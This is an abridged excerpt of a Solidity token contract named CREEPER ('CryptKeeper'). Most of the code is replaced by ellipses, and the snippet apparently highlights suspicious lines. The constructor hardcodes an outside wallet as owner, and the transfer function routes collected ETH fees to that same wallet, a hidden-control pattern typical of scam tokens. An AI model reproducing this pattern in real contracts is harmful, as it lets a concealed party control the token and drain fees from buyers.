...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0xd9D5F25BDf4D6675f9832Afe9594688360aAc519;
...
contract CREEPER is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"CryptKeeper"; 
    ...
    uint256 public _BuyFee = 10; // 1000
...
*/
    function _transfer(
        ...
        {  
            ...
            sendToWallet(payable(0xd9D5F25BDf4D6675f9832Afe9594688360aAc519), ETH_Tot);
        }
    }
        bool takeFee = true;
        bool isBuy;   
